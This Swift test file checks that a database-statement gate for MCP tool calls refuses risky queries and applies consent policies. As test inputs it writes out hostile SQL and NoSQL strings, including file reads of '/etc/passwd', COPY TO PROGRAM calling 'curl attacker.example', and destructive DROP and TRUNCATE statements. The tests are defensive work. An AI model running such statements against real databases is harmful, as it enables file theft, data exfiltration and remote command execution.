//
//  MCPStatementGateTests.swift
//  TableProTests
//

import Foundation
@testable import TablePro
import Testing

@Suite("MCPStatementGate refuses before it runs anything")
struct MCPStatementGateRefusalTests {
    private func refusal(
        sql: String,
        databaseType: DatabaseType = .postgresql,
        allowsDestructive: Bool = false,
        allowsMultiStatement: Bool = false,
        scopes: Set<MCPScope> = [.toolsRead, .toolsWrite]
    ) async throws -> MCPToolExecutionError? {
        let context = MCPToolTestHarness.context(principal: MCPToolTestHarness.principal(scopes: scopes))
        do {
            _ = try await MCPStatementGate.authorize(
                sql: sql,
                meta: MCPToolTestHarness.metadata(databaseType: databaseType),
                allowsDestructive: allowsDestructive,
                allowsMultiStatement: allowsMultiStatement,
                operationLabel: "a query",
                context: context,
                services: MCPToolTestHarness.services()
            )
            return nil
        } catch let error as MCPToolExecutionError {
            return error
        }
    }

    @Test("A statement that reads or writes files is refused on the read path")
    func filesystemStatementsAreRefused() async throws {
        let statements = [
            "COPY users FROM '/etc/passwd'",
            "COPY users TO '/tmp/leak.csv'",
            "ATTACH DATABASE '/tmp/evil.db' AS evil",
            "VACUUM INTO '/tmp/copy.db'",
            "SELECT * FROM users INTO OUTFILE '/tmp/out'",
            "SELECT pg_read_file('/etc/passwd')",
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE staging"
        ]
        for statement in statements {
            let error = try await refusal(sql: statement)
            #expect(error?.code == .denied, "\(statement) must be refused")
        }
    }

    @Test("A statement that runs server-side code is refused on the read path")
    func codeExecutionStatementsAreRefused() async throws {
        let error = try await refusal(sql: "DO $$ BEGIN PERFORM 1; END $$")
        #expect(error?.code == .denied)

        let program = try await refusal(sql: "COPY users TO PROGRAM 'curl attacker.example'")
        #expect(program?.code == .denied)

        let install = try await refusal(sql: "INSTALL httpfs", databaseType: .duckdb)
        #expect(install?.code == .denied)
    }

    @Test("The filesystem refusal wins over every other check, including destructive consent")
    func filesystemRefusalComesFirst() async throws {
        let error = try await refusal(
            sql: "COPY users TO PROGRAM 'curl attacker.example'; SELECT 1",
            allowsDestructive: true,
            allowsMultiStatement: true
        )
        #expect(error?.code == .denied)
    }

    @Test("Redis, MongoDB and Elasticsearch code surfaces are refused too")
    func nonSqlCodeSurfacesAreRefused() async throws {
        let eval = try await refusal(sql: "EVAL \"return 1\" 0", databaseType: .redis)
        #expect(eval?.code == .denied)

        let save = try await refusal(sql: "SAVE", databaseType: .redis)
        #expect(save?.code == .denied)

        let whereClause = try await refusal(
            sql: "db.users.find({$where: 'this.a == 1'})",
            databaseType: .mongodb
        )
        #expect(whereClause?.code == .denied)

        let scripts = try await refusal(sql: "GET /_scripts/evil", databaseType: .elasticsearch)
        #expect(scripts?.code == .denied)

        let snapshot = try await refusal(sql: "snapshot save backup.db", databaseType: .etcd)
        #expect(snapshot?.code == .denied)
    }

    @Test("Two statements in one call are refused unless the caller allows them")
    func multiStatementIsRefused() async throws {
        let error = try await refusal(sql: "SELECT 1; SELECT 2")
        #expect(error?.code == .invalidArgument)
    }

    @Test("A destructive statement is refused unless the caller allows destructive work")
    func destructiveIsRefusedWithoutOptIn() async throws {
        let error = try await refusal(sql: "DROP TABLE users")
        #expect(error?.code == .denied)
    }

    @Test("A write needs the tools:write scope and reports it as insufficient scope")
    func writeNeedsWriteScope() async throws {
        let context = MCPToolTestHarness.context(
            principal: MCPToolTestHarness.principal(scopes: [.toolsRead])
        )
        do {
            _ = try await MCPStatementGate.authorize(
                sql: "INSERT INTO users (id) VALUES (1)",
                meta: MCPToolTestHarness.metadata(),
                allowsDestructive: false,
                operationLabel: "a query",
                context: context,
                services: MCPToolTestHarness.services()
            )
            Issue.record("Expected the write to be refused for a read-only token")
        } catch let error as MCPProtocolError {
            #expect(error.code == JsonRpcErrorCode.forbidden)
            #expect(error.extraHeaders.contains { $0.0 == "WWW-Authenticate" })
            #expect(
                error.data?["requiredScopes"]?.arrayValue?.compactMap(\.stringValue) == ["tools:write"]
            )
        }
    }
}

@Suite("MCPStatementGate consent policy")
struct MCPStatementGateConsentPolicyTests {
    private func metadata(
        safeMode: SafeModeLevel,
        databaseType: DatabaseType = .postgresql
    ) -> ToolConnectionMetadata {
        MCPToolTestHarness.metadata(databaseType: databaseType, safeModeLevel: safeMode)
    }

    private func requiresConsent(
        _ sql: String,
        safeMode: SafeModeLevel,
        databaseType: DatabaseType = .postgresql
    ) -> Bool {
        let meta = metadata(safeMode: safeMode, databaseType: databaseType)
        return MCPStatementGate.requiresUserConsent(
            classification: QueryClassifier.classify(sql, databaseType: databaseType),
            sql: sql,
            meta: meta
        )
    }

    @Test("A plain read on a silent connection needs no consent, on any engine")
    func plainReadsNeedNoConsent() {
        #expect(!requiresConsent("SELECT * FROM users", safeMode: .silent))
        #expect(!requiresConsent("GET key", safeMode: .silent, databaseType: .redis))
        #expect(!requiresConsent("db.users.find({})", safeMode: .silent, databaseType: .mongodb))
        #expect(!requiresConsent("get /keys", safeMode: .silent, databaseType: .etcd))
    }

    @Test("Alert only asks about writes, Alert (Full) asks about every statement")
    func alertLevelsDifferOnReads() {
        #expect(!requiresConsent("SELECT * FROM users", safeMode: .alert))
        #expect(requiresConsent("SELECT * FROM users", safeMode: .alertFull))
        #expect(requiresConsent("UPDATE users SET a = 1", safeMode: .alert))
    }

    @Test("A destructive or unqualified statement always needs consent")
    func destructiveAlwaysNeedsConsent() {
        #expect(requiresConsent("DROP TABLE users", safeMode: .silent))
        #expect(requiresConsent("TRUNCATE users", safeMode: .silent))
        #expect(requiresConsent("DELETE FROM users", safeMode: .silent))
        #expect(!requiresConsent("DELETE FROM users WHERE id = 1", safeMode: .silent))
    }

    @Test("The preview a user sees is one line and capped")
    func previewIsOneCappedLine() {
        let preview = MCPStatementGate.preview(of: "SELECT\n\t1\n")
        #expect(preview == "SELECT  1")
        #expect(!preview.contains("\n"))

        let long = MCPStatementGate.preview(of: String(repeating: "a", count: 900))
        #expect((long as NSString).length == 401)
        #expect(long.hasSuffix("…"))
    }
}
